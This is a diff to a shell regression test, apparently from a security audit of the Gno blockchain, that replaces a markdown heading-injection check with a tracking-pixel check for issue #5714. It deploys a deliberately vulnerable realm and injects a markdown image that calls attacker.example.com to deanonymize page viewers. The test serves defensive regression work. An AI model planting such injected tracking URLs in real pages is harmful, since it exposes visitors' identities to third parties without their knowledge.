@@ -1,7 +1,10 @@
 #!/bin/sh
 # Targets: gnolang/gno#5714 — markdown injection in Render()
-# Vector: user-controlled title injected unsanitized into markdown body,
-# allowing arbitrary headings to be rendered in a proposal or page.
+# Vector: external image tracking pixel
+# An attacker who can inject markdown into Render() can embed an external image
+# URL. Gnoweb renders it as <img src="https://attacker.com/...">, causing every
+# visitor's browser to load the external resource — deanonymizing viewers.
+# If gnoweb ever fetches images server-side, this also becomes an SSRF vector.
 # KNOWN VULNERABLE on current master — expected regression until #5714 is fixed.
 
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -9,26 +12,25 @@ SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 . "$SCRIPT_DIR/common.sh"
 
 SUFFIX=$(date +%s)
-PKGPATH="gno.land/r/${KEY_ADDR}/audit/mdtitle${SUFFIX}"
+PKGPATH="gno.land/r/${KEY_ADDR}/audit/mdimage${SUFFIX}"
 TMPDIR=$(mktemp -d)
 trap 'rm -rf "$TMPDIR"' EXIT
 
-echo "⚠️  gnolang/gno#5714 — Title leak into body"
+echo "⚠️  gnolang/gno#5714 — External image tracking pixel"
 echo "   Package: $PKGPATH"
 
 # --- deploy vulnerable realm ---
-cat > "$TMPDIR/mdtitle.gno" << EOF
-package mdtitle
+cat > "$TMPDIR/mdimage.gno" << EOF
+package mdimage
 
-var title string
-var body = "This is the official body of the proposal."
+var content string
 
-func SetTitle(cur realm, t string) {
-	title = t
+func SetContent(cur realm, c string) {
+	content = c
 }
 
 func Render(_ string) string {
-	return "# " + title + "\n\n" + body
+	return content
 }
 EOF
 
@@ -49,13 +51,14 @@ if echo "$DEPLOY" | grep -q "OK!"; then echo "OK"; else
 	echo "FAILED"; echo "$DEPLOY"; exit 1
 fi
 
-# --- inject malicious payload ---
-# printf is required to get real newlines into the arg — shell double-quotes keep \n literal
-PAYLOAD=$(printf 'Legitimate proposal\n\n# INJECTED: Fake proposal body\n\nMalicious content injected by attacker.')
-echo -n "   Injecting malicious title... "
+# --- inject tracking pixel ---
+# The image URL is an external domain. Gnoweb renders <img src="...">,
+# which triggers a browser request to attacker.example.com on every page view.
+PAYLOAD=$(printf 'Official proposal content.\n\n![](https://attacker.example.com/track.png?realm=%s)' "$PKGPATH")
+echo -n "   Injecting tracking pixel... "
 INJECT=$(echo "$PASSWORD" | gnokey maketx call \
 	-pkgpath "$PKGPATH" \
-	-func "SetTitle" \
+	-func "SetContent" \
 	-args "$PAYLOAD" \
 	-gas-fee 1000000ugnot -gas-wanted 5000000 \
 	-broadcast -chainid "$CHAINID" -remote "$RPC" \
@@ -66,18 +69,19 @@ if echo "$INJECT" | grep -q "OK!"; then echo "OK"; else
 	echo "FAILED"; echo "$INJECT"; exit 1
 fi
 
-# --- verify: does Render() return the injected heading? ---
-echo -n "   Querying Render() (expect INJECTED heading present)... "
+# --- verify: does Render() expose the external image URL? ---
+echo -n "   Querying Render() (expect external image URL present)... "
 RESULT=$(gnokey query "vm/qeval" \
 	-data "${PKGPATH}.Render(\"\")" \
 	-remote "$RPC" 2>&1)
 
-if echo "$RESULT" | grep -q "INJECTED"; then
-	echo "⚠️  VULNERABLE — injected heading present in Render() (expected on master)"
+if echo "$RESULT" | grep -q "attacker.example.com"; then
+	echo "⚠️  VULNERABLE — external image URL present in Render() (expected on master)"
+	echo "   Every gnoweb visitor's browser will load the tracking URL"
 	echo "   Reference: https://github.com/gnolang/gno/pull/5714"
 	exit 1
-elif echo "$RESULT" | grep -q "Legitimate proposal"; then
-	echo "✅ PATCHED — title sanitized, no heading injected"
+elif echo "$RESULT" | grep -q "Official proposal"; then
+	echo "✅ PATCHED — external image URL stripped or blocked"
 else
 	echo "⚠️  UNKNOWN OUTPUT"; echo "$RESULT"; exit 1
 fi
